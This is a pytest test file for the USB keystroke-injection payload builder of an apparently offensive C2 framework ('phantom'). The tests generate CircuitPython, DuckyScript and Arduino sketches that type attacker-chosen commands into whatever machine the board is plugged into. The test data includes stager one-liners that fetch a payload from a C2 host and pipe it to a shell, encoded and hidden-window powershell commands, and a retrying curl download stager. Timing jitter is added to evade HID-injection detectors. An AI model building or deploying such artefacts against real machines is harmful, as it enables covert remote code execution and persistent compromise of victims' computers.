"""9.1/9.2 — the USB HID vector: a board that TYPES the payload.

AutoRun on removable volumes is disabled at the OS level, so a mass-storage
stick is not a vector; a keyboard-injector board is. These tests pin the
artefact per board (CircuitPython for the Pico, DuckyScript for Flipper and
O.MG), the fact that the typed command is the OPERATOR's choice with its
mismatches stated, and that nothing here guesses the target OS — it cannot,
the board types into whatever machine it is plugged into.
"""
import os

import pytest

from phantom.utils.hid_builder import (
    ARDUINO_BOARDS,
    BOARDS,
    DUCKYSCRIPT_BOARDS,
    board_notes,
    build_hid_payload,
)


class TestBoards:
    @pytest.mark.parametrize("board", BOARDS)
    def test_every_board_produces_an_artefact(self, board):
        payload = build_hid_payload(board, "whoami")
        assert payload.content
        assert payload.board == board
        assert payload.filename

    @pytest.mark.parametrize("board", DUCKYSCRIPT_BOARDS)
    def test_the_keystroke_boards_get_duckyscript(self, board):
        payload = build_hid_payload(board, "whoami", delay_ms=1000)
        assert payload.filename.endswith(".txt")
        assert "DELAY 1000" in payload.content
        assert "STRING whoami" in payload.content
        assert payload.content.rstrip().endswith("ENTER")

    def test_the_pico_gets_circuitpython(self):
        payload = build_hid_payload("pico", "whoami", delay_ms=2000)
        assert payload.filename == "main.py"
        assert "import usb_hid" in payload.content
        assert "adafruit_hid.keyboard_layout_us" in payload.content
        assert "time.sleep(2.00)" in payload.content
        assert "layout.write('whoami')" in payload.content
        assert "Keycode.ENTER" in payload.content

    def test_an_unknown_board_is_refused(self):
        with pytest.raises(ValueError) as excinfo:
            build_hid_payload("teensy", "whoami")
        assert "teensy" in str(excinfo.value)

    def test_an_empty_command_is_refused(self):
        with pytest.raises(ValueError):
            build_hid_payload("pico", "   ")

    def test_board_case_does_not_matter(self):
        assert build_hid_payload("PICO", "x").board == "pico"


class TestTheTypedCommand:
    def test_the_command_is_typed_verbatim(self):
        cmd = "curl -sk 'https://10.0.0.5:8443/api/v1/payload_linux?auth=T' | sh"
        payload = build_hid_payload("flipper", cmd)
        assert f"STRING {cmd}" in payload.content

    def test_enter_is_optional(self):
        assert "ENTER" not in build_hid_payload("omg", "x",
                                                press_enter=False).content

    def test_grouping_quotes_are_not_typed(self):
        # `payload hid pico "powershell -Enc X"`: the quotes group the
        # argument for the shell, they are not part of the instruction
        payload = build_hid_payload("pico", '"powershell -Enc X"')
        assert "layout.write('powershell -Enc X')" in payload.content

    def test_quotes_inside_the_command_survive(self):
        payload = build_hid_payload("pico", 'echo "a b"')
        assert 'layout.write(\'echo "a b"\')' in payload.content

    def test_the_board_cannot_detect_the_target_and_says_so(self):
        notes = build_hid_payload("pico", "whoami").notes
        assert any("must match the TARGET os" in n for n in notes), notes

    def test_a_linux_opener_is_used_instead_of_the_windows_one(self):
        # --run used to be Windows-only and a linux target got a warning; the
        # opener is now universal (one chord per target family).
        notes = build_hid_payload("flipper", "whoami", target="linux",
                                  open_run=True).notes
        assert any("Ctrl+Alt+T" in n for n in notes), notes
        body = build_hid_payload("flipper", "whoami", target="linux",
                                 open_run=True).content
        assert "HOLD CTRL ALT T" in body
        assert "HOLD GUI R" not in body

    def test_a_target_without_a_known_opener_is_flagged(self):
        notes = build_hid_payload("flipper", "whoami", target="android",
                                  open_run=True).notes
        assert any("no opener is known" in n for n in notes), notes

    def test_a_windows_command_on_a_linux_target_is_flagged(self):
        notes = build_hid_payload(
            "flipper", "powershell -Enc AAAA", target="linux").notes
        assert any("looks Windows" in n for n in notes), notes

    def test_a_posix_command_on_a_windows_target_is_flagged(self):
        notes = build_hid_payload("pico", "curl -sk http://h/x | sh",
                                  target="windows").notes
        assert any("looks POSIX" in n for n in notes), notes

    def test_a_matching_command_needs_no_warning(self):
        notes = build_hid_payload("pico", "whoami", target="linux").notes
        assert not any("looks" in n for n in notes), notes

    def test_a_long_command_is_flagged_as_visible_and_slow(self):
        notes = build_hid_payload("arduino", "x" * 5000).notes
        assert any("very long command" in n for n in notes), notes

    def test_the_short_stager_command_needs_no_length_warning(self):
        notes = build_hid_payload("flipper", "whoami").notes
        assert not any("very long command" in n for n in notes), notes


class TestTheArduinoBoard:
    """A scant-flash Arduino-IDE board: the beacon is NOT on the board, so
    tens of KB of flash is enough to hold the firmware and the typed
    command — the stager downloads the beacon from the C2."""

    @pytest.mark.parametrize("board", ARDUINO_BOARDS)
    def test_it_gets_a_keyboard_sketch(self, board):
        payload = build_hid_payload(board, "whoami", delay_ms=2000)
        assert payload.filename == "phantom_hid.ino"
        assert "#include <Keyboard.h>" in payload.content
        assert "delay(2000)" in payload.content
        assert 'Keyboard.print(F("whoami"));' in payload.content
        assert "KEY_RETURN" in payload.content

    def test_the_command_is_kept_in_flash_not_ram(self):
        notes = build_hid_payload("arduino", "whoami").notes
        assert any("must match the TARGET os" in n for n in notes), notes
        flash_notes = board_notes("arduino")
        assert any("F()" in n and "flash" in n for n in flash_notes)
        assert any("beacon" in n for n in flash_notes)

    def test_a_multi_kilobyte_command_still_builds(self):
        payload = build_hid_payload("arduino", "A" * 11000, target="windows")
        assert payload.content.count("A") >= 11000

    def test_quotes_and_backslashes_in_the_command_are_escaped(self):
        payload = build_hid_payload("arduino", 'echo "a b" \\x')
        assert 'Keyboard.print(F("echo \\"a b\\" \\\\x"));' in payload.content

    def test_enter_is_optional(self):
        assert "KEY_RETURN" not in build_hid_payload(
            "arduino", "x", press_enter=False).content

    def test_the_run_dialog_is_typed_before_the_command(self):
        payload = build_hid_payload("flipper", "whoami", target="windows",
                                    open_run=True)
        body = payload.content
        assert body.index("HOLD GUI R") < body.index("STRING whoami")
        pico = build_hid_payload("pico", "whoami", target="windows",
                                 open_run=True).content
        assert pico.index("kbd.press(Keycode.GUI, Keycode.R)") < \
            pico.index("layout.write")


class TestTheTypingCadence:
    """A board left at full speed types a stager in a fraction of a second.

    That is the second thing a HID-injection detector sees, after the device
    itself, and it is the one property of the rhythm this layer can change:
    the command is typed in BURSTS with a jittered pause between them. The
    content stays whatever the operator asked for — slowing it down does not
    make an `iex`+download one-liner signature-free, and the artefact does
    not pretend otherwise.
    """

    CMD = "powershell -w h -c \"$i=0;" + "x" * 200 + "\""

    @staticmethod
    def _typed(body):
        raw = "".join(ln.split('Keyboard.print(F("', 1)[1].rsplit('"));', 1)[0]
                      for ln in body.splitlines() if "Keyboard.print(F(" in ln)
        return raw.replace("\\\\", "\\").replace('\\"', '"')

    def test_a_long_command_is_typed_in_bursts_not_in_one_go(self):
        body = build_hid_payload("arduino", self.CMD).content
        prints = [ln for ln in body.splitlines() if "Keyboard.print(F(" in ln]
        assert len(prints) > 10
        assert body.count("delay(") > 10

    def test_the_pauses_are_jittered_not_a_metronome(self):
        body = build_hid_payload("arduino", self.CMD).content
        pauses = [ln.strip() for ln in body.splitlines()
                  if ln.strip().startswith("delay(")]
        assert len(set(pauses)) > 5

    def test_the_same_command_always_types_the_same_way(self):
        # deterministic seed: two generations of one artefact are byte-equal,
        # so "does the artefact match the one I tested" stays answerable
        assert build_hid_payload("arduino", self.CMD).content == \
            build_hid_payload("arduino", self.CMD).content

    def test_no_character_is_lost_between_bursts(self):
        body = build_hid_payload("arduino", self.CMD).content
        assert self._typed(body) == self.CMD

    def test_a_short_command_still_types_in_one_go(self):
        # slowing down six characters is not stealth, it is a longer window
        # for the focus to move
        body = build_hid_payload("arduino", "whoami").content
        assert 'Keyboard.print(F("whoami"));' in body

    def test_zero_cadence_is_the_old_single_burst(self):
        body = build_hid_payload("arduino", self.CMD, char_delay_ms=0).content
        assert len([ln for ln in body.splitlines()
                    if "Keyboard.print(F(" in ln]) == 1

    def test_the_pico_sleeps_between_bursts(self):
        body = build_hid_payload("pico", self.CMD).content
        assert body.count("layout.write(") > 10
        assert len([ln for ln in body.splitlines()
                    if ln.startswith("time.sleep(")]) > 10

    def test_the_artefact_says_how_long_it_will_take(self):
        notes = build_hid_payload("arduino", self.CMD).notes
        assert any("chars/s" in n for n in notes), notes

    def test_the_default_cadence_types_a_stager_in_seconds(self):
        # Measured 2026-11-01: the 90 ms default put ~21 s of visible typing on
        # screen, and the operator could not tell "still typing" from "hung".
        # The cadence is a cost paid for not looking like a machine; it must
        # not cost a payload nobody waits for. The whole delay budget of the
        # sketch stays under ~8 s, and under ~45 ms per typed character.
        import re

        body = build_hid_payload("arduino", self.CMD).content
        # every delay(), including the ones carrying a trailing comment
        total = sum(int(m.group(1))
                    for m in re.finditer(r"delay\((\d+)\)", body))
        assert total < 12000, total
        assert total < len(self.CMD) * 45, total

    def test_duckyscript_boards_say_the_cadence_could_not_be_applied(self):
        # STRING runs at the device's own rate; claiming otherwise would be
        # the kind of silence this project treats as a defect
        notes = build_hid_payload("flipper", self.CMD).notes
        assert any("cadence NOT applied" in n for n in notes), notes

    def test_the_cadence_flag_reaches_the_sketch(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        out = os.path.join(str(tmp_path), "zero.ino")
        with mock.patch("phantom.modules.payload.notifier"):
            PayloadModule().do_hid(f"arduino '{self.CMD}' --cadence 0 "
                                   f"--out {out}")
        with open(out, encoding="utf-8") as handle:
            body = handle.read()
        assert body.count('Keyboard.print(F("') == 1

    def test_a_negative_cadence_is_refused(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        out = os.path.join(str(tmp_path), "neg.ino")
        with mock.patch("phantom.modules.payload.notifier") as note:
            PayloadModule().do_hid(f"arduino whoami --cadence -5 --out {out}")
        assert not os.path.exists(out)
        assert "cannot be negative" in " ".join(
            str(c) for c in note.error.call_args_list)


class TestFlashingNotes:
    @pytest.mark.parametrize("board", BOARDS)
    def test_every_board_explains_how_it_is_flashed(self, board):
        notes = board_notes(board)
        assert notes and any(len(n) > 20 for n in notes)

    def test_an_unknown_board_has_no_notes(self):
        assert board_notes("teensy") == ()


class TestHidCommand:
    def _run(self, arg, tmp_path):
        from unittest import mock
        from phantom.modules.payload import PayloadModule
        module = PayloadModule()
        out = os.path.join(str(tmp_path), "artefact")
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            # --layout us is PINNED here: these tests assert the exact bytes the
            # board would type, and the layout is pre-translated per TARGET.
            # The CLI takes that layout from the bench's locale (the fix for
            # `:` arriving as `ç` on an Italian host), so leaving it out would
            # make every assertion below depend on where the suite runs.
            module.do_hid(f"{arg} --layout us --out {out}")
        with open(out, encoding="utf-8") as handle:
            return handle.read(), notifier

    def test_it_writes_the_artefact_the_operator_asked_for(self, tmp_path):
        content, _ = self._run("pico 'whoami' --target linux", tmp_path)
        assert "usb_hid" in content and "layout.write('whoami')" in content

    def test_the_stager_flag_types_a_short_fetcher_by_default(self, tmp_path):
        content, notifier = self._run(
            "flipper --stager linux --target linux", tmp_path)
        assert "STRING " in content
        # HID default is DOWNLOAD: the board types a ~300-char fetcher and the
        # C2 serves the beacon. The 11.4k inline one-liner is opt-in — the
        # LENGTH is the cost on this channel, and only on this channel.
        assert "/api/v1/payload_linux" in content
        assert "base64 -d | sh" not in content

    def test_the_inline_stager_is_still_available(self, tmp_path):
        content, notifier = self._run(
            "flipper --stager linux --target linux --stager-mode inline",
            tmp_path)
        # the resilient POSIX stager, carrying the C2 endpoint inside its own
        # retry script (option C, 8.1) — what `--stager` used to do for HID
        assert "base64 -d | sh" in content

    def test_the_arduino_download_stager_is_resilient_and_fits_the_board(
            self, tmp_path):
        content, _ = self._run(
            "arduino --stager linux --target linux", tmp_path)
        # the download stager retries CLIENT-side (a curl loop), so a C2 that
        # is cold when the board is plugged in is not a lost payload — and
        # nothing was scheduled on the host to achieve it
        assert "while ! curl" in content
        assert '#include <Keyboard.h>' in content

    def test_a_stager_target_mismatch_is_refused_before_writing(self,
                                                                tmp_path):
        from phantom.modules.payload import PayloadModule
        module = PayloadModule()
        out = os.path.join(str(tmp_path), "nope")
        from unittest import mock
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            module.do_hid(f"flipper --stager linux --target windows "
                          f"--out {out}")
        assert not os.path.exists(out)
        assert any("PE ≠ ELF" in str(c) or "pick one" in str(c)
                   for c in notifier.error.call_args_list)

    def test_a_missing_board_is_refused(self, tmp_path):
        from phantom.modules.payload import PayloadModule
        from unittest import mock
        with mock.patch("phantom.modules.payload.notifier") as notifier:
            PayloadModule().do_hid("--stager linux")
        assert notifier.error.called

    def test_the_command_is_listed_in_the_module_help(self):
        from phantom.modules.payload import PayloadModule
        commands = PayloadModule().build_commands()
        assert any("hid" in c for c in commands["DELIVERY"])


class TestItDoesNotTypeOnTheMachineThatWroteIt:
    """The board is written (and reset) while plugged into the operator's box.

    Two independent guards, because the failure is silent and embarrassing:
    a visible countdown to unplug it, and a per-build tag that makes the FIRST
    boot after a flash do nothing at all.
    """

    def test_the_first_boot_after_a_flash_is_silent(self):
        body = build_hid_payload("arduino", "whoami").content
        assert "#include <EEPROM.h>" in body
        assert "if (justFlashed())" in body
        # the guard returns BEFORE anything is typed
        assert body.index("if (justFlashed())") < body.index("Keyboard.print")

    def test_the_tag_belongs_to_this_artefact_only(self):
        first = build_hid_payload("arduino", "whoami").content
        again = build_hid_payload("arduino", "whoami").content
        other = build_hid_payload("arduino", "whoami2").content
        tag = next(ln for ln in first.splitlines() if "BUILD_TAG = " in ln)
        assert tag in again
        assert tag not in other      # a new build must be "never seen before"

    def test_the_countdown_blinks_before_typing(self):
        body = build_hid_payload("arduino", "whoami", countdown_s=15).content
        assert "countdown(15);" in body
        assert body.index("countdown(15);") < body.index("Keyboard.print")
        assert "digitalWrite(LED_PIN, HIGH);" in body

    def test_the_countdown_can_be_skipped(self):
        body = build_hid_payload("arduino", "whoami", countdown_s=0).content
        assert "countdown(" not in body

    def test_the_guard_can_be_turned_off(self):
        body = build_hid_payload("arduino", "whoami",
                                 first_boot_safe=False).content
        assert "justFlashed" not in body
        assert "EEPROM.h" not in body

    def test_the_pico_parks_forever_instead_of_exiting(self):
        # ending main.py makes CircuitPython RELOAD it, and the reload would
        # then type into the machine we are trying not to touch
        body = build_hid_payload("pico", "whoami").content
        assert "microcontroller.nvm" in body
        assert "while True:" in body
        assert body.index("_just_written") < body.index("layout.write(")

    def test_duckyscript_says_both_guards_are_unavailable(self):
        notes = build_hid_payload("flipper", "whoami").notes
        assert any("first-boot guard NOT available" in n for n in notes), notes
        body = build_hid_payload("flipper", "whoami", countdown_s=15).content
        assert "DELAY 15000" in body

    def test_the_flags_reach_the_sketch(self, tmp_path):
        from unittest import mock

        from phantom.modules.payload import PayloadModule

        out = os.path.join(str(tmp_path), "guarded.ino")
        with mock.patch("phantom.modules.payload.notifier") as note:
            PayloadModule().do_hid(f"arduino whoami --countdown 5 "
                                   f"--no-first-boot-safe --out {out}")
        with open(out, encoding="utf-8") as handle:
            body = handle.read()
        assert "countdown(5);" in body
        assert "justFlashed" not in body
        assert any("countdown on a blinking LED" in str(c)
                   for c in note.warn.call_args_list), note.warn.call_args_list
